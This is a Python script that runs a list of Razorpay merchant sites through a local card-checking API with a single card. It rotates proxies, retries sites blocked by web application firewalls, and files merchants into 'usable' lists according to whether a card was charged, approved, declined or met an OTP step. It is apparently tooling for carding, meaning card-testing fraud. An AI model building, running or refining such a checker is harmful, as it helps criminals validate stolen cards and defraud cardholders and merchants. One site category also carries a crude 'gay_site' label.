#!/usr/bin/env python3
"""
test_sites.py — bulk test 300-400 Razorpay sites through local API with ONE card.

Usage:
    python test_sites.py --sites sites.txt --card "4111111111111111|12|2027|123" --key limca

Reads sites, hits /razorpay?key=limca for each (pool mode = auto proxy + retry),
classifies results, writes:
  good_sites.txt              -> sites that gave a real card response (USABLE)
  bad_no_card_support.txt     -> sites that reject cards (intl/card type not supported)
  bad_dead_sites.txt          -> sites that are dead / inactive / merchant blocked
  recheck_sites.txt           -> server_error sites (retry later)
  waf_blocked_sites.txt       -> proxy got 403/406 (retry with fresh proxies)
  error_sites.txt             -> network/timeout
  summary.json                -> full counts
  results.jsonl               -> per-site raw result (resumable)

Resume: re-run with same --out, it skips already-done sites.
Retry specific buckets: --retry-failed or --retry-waf
"""
import argparse, asyncio, json, os, sys, time
from datetime import datetime
import httpx

# ── Classification ─────────────────────────────────────────────────────
GOOD_REASONS = {
    'charged', 'approved', 'declined', '3ds_or_otp', 'ccn',
    'rzp_risk_decline', 'live_limit', 'auth_failed', 'rzp_bad_request',
}
SKIP_NO_CARD = {
    'international_not_supported', 'currency_mismatch',
    'invalid_fee', 'amount_mismatch', 'mandatory_item',
    'card_type_not_allowed', 'card_network_not_enabled',
    'online_payments_not_enabled',
}
SKIP_DEAD = {
    'gay_site', 'merchant_blocked', 'merchant_not_activated',
    'payment_page_inactive', 'site_unavailable', 'site_change',
}
RECHECK = {'rzp_server_error', 'server_error'}

def classify(result):
    status = str(result.get('status') or '').lower()
    reason = str(result.get('reason') or '').lower()
    msg    = str(result.get('message') or '').lower()

    if status == 'charged':  return 'GOOD', 'charged'
    if status == 'approved': return 'GOOD', f'approved ({reason or "?"})'
    if status == 'dead' and reason in GOOD_REASONS:
        return 'GOOD', f'declined ({reason})' if reason != 'declined' else 'declined'
    if reason in SKIP_NO_CARD: return 'SKIP_NO_CARD', reason
    if reason in SKIP_DEAD:    return 'SKIP_DEAD', reason
    if reason in RECHECK or 'server error' in msg:
        return 'RECHECK', reason or 'server_error'
    if 'waf' in reason or '403' in msg or '406' in msg:
        return 'WAF', reason or 'waf'
    if 'timeout' in msg or 'connect' in msg: return 'ERROR', 'network'
    if status == 'error': return 'ERROR', reason or 'unknown_error'
    if status == 'dead':  return 'GOOD', f'declined ({reason or "?"})'
    return 'UNKNOWN', f'{status}/{reason}'

# ── Load sites ─────────────────────────────────────────────────────────
def load_sites(path):
    if not os.path.exists(path):
        sys.exit(f"missing sites file: {path}")
    seen, out = set(), []
    with open(path, encoding='utf-8') as f:
        for line in f:
            s = line.strip()
            if not s or s.startswith('#') or not s.startswith('http'):
                continue
            key = s.lower().rstrip('/')
            if key in seen: continue
            seen.add(key); out.append(s)
    return out

# ── Test one site ──────────────────────────────────────────────────────
async def test_one(client, api, card, site, key, proxy, amount, timeout):
    params = {'cc': card, 'site': site, 'amount': str(amount)}
    if key:       params['key'] = key
    elif proxy:   params['proxy'] = proxy
    else:
        return {'site': site, 'verdict': 'ERROR', 'why': 'no_key_or_proxy',
                'result': {}, 'time_s': 0}
    t0 = time.time()
    try:
        r = await client.get(f"{api}/razorpay", params=params, timeout=timeout)
        try: data = r.json()
        except Exception:
            data = {'status': 'error', 'message': f'non-json http {r.status_code}',
                    'reason': 'non_json'}
    except httpx.TimeoutException:
        data = {'status': 'error', 'message': 'api timeout', 'reason': 'timeout'}
    except Exception as e:
        data = {'status': 'error', 'message': str(e)[:200], 'reason': 'exception'}
    v, why = classify(data)
    return {'site': site, 'verdict': v, 'why': why, 'result': data,
            'time_s': round(time.time() - t0, 2)}

# ── Resume ─────────────────────────────────────────────────────────────
def load_done(p):
    done = {}
    if not os.path.exists(p): return done
    with open(p, encoding='utf-8') as f:
        for line in f:
            try:
                e = json.loads(line); done[e['site']] = e
            except Exception: continue
    return done

# ── Main ───────────────────────────────────────────────────────────────
async def main_async(a):
    sites = load_sites(a.sites)
    if not sites: sys.exit(f"no valid sites in {a.sites}")

    os.makedirs(a.out, exist_ok=True)
    jsonl = os.path.join(a.out, 'results.jsonl')
    done = load_done(jsonl)

    if a.retry_failed:
        to_test = [s for s in sites if s not in done or done[s]['verdict'] in ('WAF','ERROR','RECHECK','UNKNOWN')]
    elif a.retry_waf:
        to_test = [s for s in sites if s not in done or done[s]['verdict'] == 'WAF']
    else:
        to_test = [s for s in sites if s not in done]

    print(f"total: {len(sites)} | done: {len(done)} | to test: {len(to_test)}")
    print(f"concurrency={a.concurrency} | mode={'pool' if a.key else 'proxy'} | out={a.out}")
    print('─' * 70)

    if not to_test:
        _write_summary(a, done, sites); return

    sem = asyncio.Semaphore(a.concurrency)
    lock = asyncio.Lock()
    n = {'i': 0}
    jsonl_fh = open(jsonl, 'a', encoding='utf-8')

    async def worker(client, site):
        async with sem:
            r = await test_one(client, a.api, a.card, site, a.key,
                               a.proxy, a.amount, a.timeout)
            async with lock:
                n['i'] += 1
                jsonl_fh.write(json.dumps(r) + '\n'); jsonl_fh.flush()
                done[site] = r
                tag = r['verdict'][:13].ljust(13)
                print(f"[{n['i']:>4}/{len(to_test)}] {tag} {r['why'][:32]:<32} {site}")

    try:
        async with httpx.AsyncClient(follow_redirects=True) as client:
            await asyncio.gather(*[worker(client, s) for s in to_test])
    finally:
        jsonl_fh.close()

    _write_summary(a, done, sites)

def _write_summary(a, done, all_sites):
    buckets = {'GOOD': [], 'SKIP_NO_CARD': [], 'SKIP_DEAD': [],
               'RECHECK': [], 'WAF': [], 'ERROR': [], 'UNKNOWN': []}
    for site, r in done.items():
        buckets.setdefault(r.get('verdict','UNKNOWN'), []).append(site)
    def _w(name, items):
        p = os.path.join(a.out, name)
        with open(p, 'w', encoding='utf-8') as f:
            for s in sorted(items): f.write(s + '\n')
        return p
    good_p    = _w('good_sites.txt', buckets['GOOD'])
    noc_p     = _w('bad_no_card_support.txt', buckets['SKIP_NO_CARD'])
    dead_p    = _w('bad_dead_sites.txt', buckets['SKIP_DEAD'])
    rechk_p   = _w('recheck_sites.txt', buckets['RECHECK'])
    waf_p     = _w('waf_blocked_sites.txt', buckets['WAF'])
    err_p     = _w('error_sites.txt', buckets['ERROR'] + buckets['UNKNOWN'])

    summary = {
        'tested': len(done), 'total_input': len(all_sites),
        'counts': {k: len(v) for k, v in buckets.items()},
        'files': {'good': good_p, 'bad_no_card': noc_p, 'bad_dead': dead_p,
                  'recheck': rechk_p, 'waf': waf_p, 'errors': err_p},
        'generated_at': datetime.now().isoformat(),
    }
    sp = os.path.join(a.out, 'summary.json')
    with open(sp, 'w', encoding='utf-8') as f: json.dump(summary, f, indent=2)

    print('\n' + '═' * 70); print('SUMMARY'); print('═' * 70)
    for k, v in summary['counts'].items(): print(f"  {k:<16} {v}")
    print('─' * 70)
    print(f"  good_sites.txt          -> {good_p}")
    print(f"  bad_no_card_support.txt -> {noc_p}")
    print(f"  bad_dead_sites.txt      -> {dead_p}")
    print(f"  recheck_sites.txt       -> {rechk_p}")
    print(f"  waf_blocked_sites.txt   -> {waf_p}")
    print(f"  error_sites.txt         -> {err_p}")
    print(f"  summary.json            -> {sp}")
    print('═' * 70)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--sites', required=True)
    ap.add_argument('--card', required=True, help='number|MM|YYYY|CVV')
    ap.add_argument('--api', default='http://localhost:9000')
    ap.add_argument('--key', default='limca', help='API key (pool mode). use "" to switch to --proxy')
    ap.add_argument('--proxy', default=None, help='single proxy if not using key')
    ap.add_argument('--amount', type=int, default=100)
    ap.add_argument('--out', default='./site_test_results')
    ap.add_argument('--concurrency', type=int, default=5)
    ap.add_argument('--timeout', type=float, default=120.0)
    ap.add_argument('--retry-failed', action='store_true')
    ap.add_argument('--retry-waf', action='store_true')
    asyncio.run(main_async(ap.parse_args()))

if __name__ == '__main__':
    main()